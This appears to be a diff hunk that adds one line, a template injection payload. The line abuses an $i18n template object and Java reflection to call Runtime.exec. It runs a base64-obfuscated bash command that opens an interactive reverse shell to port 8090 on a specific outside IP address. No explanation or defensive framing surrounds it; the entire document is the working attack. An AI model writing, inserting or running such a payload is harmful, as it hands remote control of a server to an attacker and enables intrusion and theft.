@@ -1,0 +1,1 @@
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xODUuMTE3LjkwLjI4LzgwOTAgMD4mMQ==}|{base64,-d}|{bash,-i}').waitFor() 
